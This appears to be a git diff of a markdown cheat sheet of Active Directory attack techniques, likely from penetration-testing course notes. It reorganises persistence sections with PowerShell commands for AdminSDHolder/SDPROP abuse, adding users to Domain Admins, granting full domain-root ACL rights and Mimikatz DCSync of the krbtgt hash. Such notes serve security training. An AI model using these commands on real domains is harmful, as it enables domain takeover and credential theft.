@@ -55,10 +55,13 @@ C:> Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security
 ```
 - All logons on DC logged to `C:\Windows\system32\kiwissp.log`
 
-### SDPROP and AdminSDHolder
-- `sdprop` is a process that runs evey hour and compares ACL of protected groups with members of the ACL of `AdminSDHolder`. Any differences are overwriten.
-- With DA privileges on `AdminSDHolder` object, a user can be added to the `AsminSDHolder` ACL and will be added to protected groups when `sdprop` runs
+### ACL Persistence
+
+- **SDPROP and AdminSDHolder**
 ```powershell
+#`sdprop` is a process that runs evey hour and compares ACL of protected groups with members of the ACL of `AdminSDHolder`. Any differences are overwriten.
+# With DA privileges on `AdminSDHolder` object, a user can be added to the `AsminSDHolder` ACL and will be added to protected groups when `sdprop` runs
+# Load Module
 C:> . .\Invoke-SDPropagator.ps1
 
 # Force `sdprop` to run
@@ -82,7 +85,7 @@ C:> Add-DomainGroupMember -Identity 'Domain Admins' .Members <username> -Verbose
 # Change user password
 C:> Set-DomainUserPassword -Identity <usernname> -AccountPassword (ConvertTo-SecureString "Password@" -AsPlainText -Force) -Verbose
 ```
-### Abuse ACL 
+- **Domain Root Object ACL**
 ```powershell
 # Add Full Rights to Domain Root ACL
 C:> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity <username> -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
@@ -93,6 +96,9 @@ C:> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -P
 # Execute DCSync
 C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
+
+- **Security Descriptors**
+
 ### MORE
 
 
